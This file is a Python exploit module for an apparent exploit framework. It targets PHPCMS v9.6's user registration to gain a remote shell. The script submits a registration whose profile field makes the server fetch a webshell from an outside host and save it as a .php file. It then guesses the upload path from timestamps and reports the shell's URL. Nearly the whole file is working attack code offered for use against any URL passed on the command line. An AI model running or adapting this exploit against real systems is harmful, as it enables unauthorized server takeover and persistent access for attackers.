#coding: utf-8

import os
import sys
from datetime import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
import re, random
import time


"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit

"""
class phpcms_register_getshell(Exploit):
    def meta_info(self):
        return {
            'name': 'phpcms_register_getshell',
            'author': 'h',
            'date': '2018-02-28',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'PHPCMS',
            'min_version': '',
            'max_version': '',
            'version_list': '9.6',             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'phpcms v9.6注册功能远程getshell，前台访问时，注册用户时，设置头像为远程地址，可导致GetShell',
            'reference':'phpcms v9.6注册功能远程getshell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        url = self.url + "/index.php?m=member&c=index&a=register&siteid=1"
        data = {
            "siteid": "1",
            "modelid": "1",
            "username": get_random_password(9),
            "password": get_random_password(12),
            "email": "%s@xx.com" % get_random_password(9),
            "info[content]": "<img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg>", #远程webshell地址
            "dosubmit": "1",
            "protocol": "",
        }
        try:
            req = session()
            startTime, _ = self.getTime()
            htmlContent = req.post(url=url, data=data)
            finishTime, dateUrl = self.getTime()
            if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
                successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
                self.shell_info(successUrl, 'akkuman', 'php')
            else:
                successUrl = ""
                for t in range(startTime, finishTime):
                    checkUrlHtml = req.get(url=self.url + "/uploadfile/" + dateUrl + str(t) + ".php")
                    if checkUrlHtml.status_code == 200:
                        successUrl = self.url + "/uploadfile/" + dateUrl + str(t) + ".php"
                        self.shell_info(successUrl, 'akkuman', 'php')
                        print successUrl
                        break
        except Exception as e:
            # print e
            pass
            
    def getTime(self):
        year = str(datetime.now().year)
        month = "%02d" % datetime.now().month
        day = "%02d" % datetime.now().day
        hour = datetime.now().hour
        hour = hour - 12 if hour > 12 else hour
        hour = "%02d" % hour
        minute = "%02d" % datetime.now().minute
        second = "%02d" % datetime.now().second
        microsecond = "%06d" % datetime.now().microsecond
        microsecond = microsecond[:3]
        nowTime = year + month + day + hour + minute + second + microsecond
        return int(nowTime), year + "/" + month + day + "/"
        
if __name__ == "__main__":
    # url = 'http://localhost:92/install_package/index.php'
    # a = phpcms_register_getshell(url)
    # a.exploit()
    if len(sys.argv) == 2:
        a = phpcms_register_getshell(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__

